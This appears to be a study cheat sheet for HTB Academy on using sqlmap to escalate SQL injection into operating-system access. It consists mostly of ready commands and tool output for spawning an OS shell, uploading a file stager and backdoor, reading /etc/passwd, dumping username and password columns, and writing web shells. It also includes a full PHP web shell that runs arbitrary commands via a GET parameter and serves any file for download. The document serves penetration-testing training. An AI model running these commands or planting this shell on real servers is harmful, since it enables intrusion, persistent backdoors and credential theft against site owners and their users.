# 🛰️ Direct OS Shell Access

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

## 🔍 SQLMap Deployment Process

**Which web application language does the web server support?**

1. ASP
2. ASPX  
3. JSP
4. PHP (default)

**What do you want to use for writable directory?**

1. Common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, ...') (default)
2. Custom location(s)
3. Custom directory list file
4. Brute force search

Example interaction:

```bash
which web application language does the web server support?
[1] ASP
[2] ASPX  
[3] JSP
[4] PHP (default)
> 4

what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, ...') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
```

---

# 🛠️ Troubleshooting OS Shell Issues

## ⚙️ Common Problems & Solutions

**1. No Output from UNION Technique**
```bash
os-shell> ls -la
No output

# Solution:
sqlmap -u "URL" --os-shell --technique=E
```

**2. Permission Denied Errors**
```bash
[WARNING] potential permission problems detected ('Permission denied')
[WARNING] unable to upload the file stager on '/var/www/'

# Solution: Try alternative directories
[INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[INFO] the file stager has been successfully uploaded on '/var/www/html/'
```

**3. Web Root Discovery**
```bash
# Automatic web root discovery
sqlmap -u "URL" --os-shell --batch  # Uses common locations

# Manual web root specification
sqlmap -u "URL" --os-shell
# Choose option [2] custom location(s)
# Enter: /var/www/html, /usr/local/apache2/htdocs, etc.
```

---

# 💡 Advanced OS Exploitation Techniques

## ⚙️ Multiple Technique Testing
```bash
# Try different SQLi techniques for OS shell
sqlmap -u "URL" --os-shell --technique=U    # UNION-based
sqlmap -u "URL" --os-shell --technique=E    # Error-based  
sqlmap -u "URL" --os-shell --technique=B    # Boolean-based (slower)
sqlmap -u "URL" --os-shell --technique=T    # Time-based (very slow)
```

## ⚙️ Custom Shell Upload
```bash
# Upload custom backdoor
sqlmap -u "URL" --file-write "custom_shell.php" --file-dest "/var/www/html/backdoor.php"

# Multi-functional shell
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
    }
}
?>
EOF
```

---

# 🧑‍💻 HTB Academy Examples

## 🔑 Flag Reading Challenge
```bash
sqlmap -u "http://target/?id=1" --file-read "/var/www/html/flag.txt"

# Alternative locations to try:
sqlmap -u "URL" --file-read "/flag.txt"
sqlmap -u "URL" --file-read "/home/flag.txt"  
sqlmap -u "URL" --file-read "/root/flag.txt"
```

## 🔍 Interactive OS Shell Challenge
```bash
# Get interactive shell and explore
sqlmap -u "http://target/?id=1" --os-shell --technique=E --batch

# Commands to try in shell:
os-shell> find / -name "*flag*" -type f 2>/dev/null
os-shell> cat /path/to/discovered/flag
os-shell> ls -la /var/www/html/
os-shell> ps aux
os-shell> whoami
```

---

## 📚 Quick Reference: OS Exploitation

### Privilege Verification
```bash
# Check DBA status
sqlmap -u "URL" --is-dba 
```

### File Operations
```bash
# Read system files and flag files
sqlmap -u "URL" --file-read "/etc/passwd"
sqlmap -u "URL" --file-read "/var/www/html/flag.txt"

# Upload web shell
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### OS Shell Access
```bash
# Automated and forced error-based technique
sqlmap -u "URL" --os-shell --batch 
sqlmap -u "URL" --os-shell --technique=E --batch 
```

### HTB Academy Solutions
```bash
# Flag reading challenge
sqlmap -u "URL" --file-read "/var/www/html/flag.txt"

# Interactive shell challenge
sqlmap -u "URL" --os-shell --technique=E
```

---

## 🔄 Complete Enumeration Workflow

### Step-by-Step Discovery and Enumeration
```bash
# Basic discovery 
sqlmap -u "http://target.com/page.php?id=1" --batch --banner --current-user --current-db 

# Database enumeration  
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs

# Table enumeration
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name --tables

# Column enumeration
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name -T table_name --columns

# Data extraction 
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name -T table_name -C username,password --dump 

# File operations (if DBA)
sqlmap -u "http://target.com/page.php?id=1" --batch --file-read "/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --batch --os-shell
```

### Quick Reference Commands
```bash
# Fast automated scan
sqlmap -u "URL" --batch --level=5 --risk=3 

# POST request with session
sqlmap -u "URL" --data="param=value" --cookie="session=abc" --batch

# File read + write + shell
sqlmap -u "URL" --file-read="/etc/passwd" --batch 
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/" --batch  
sqlmap -u "URL" --os-shell --batch
```

---

# 🔍 Burp Suite Integration

**Workflow integration:**
1. Intercept request in Burp Suite
2. Save request to file (req.txt)
3. Use: `sqlmap -r req.txt --batch`
4. Analyze results in Burp Scanner
5. Manual verification with Repeater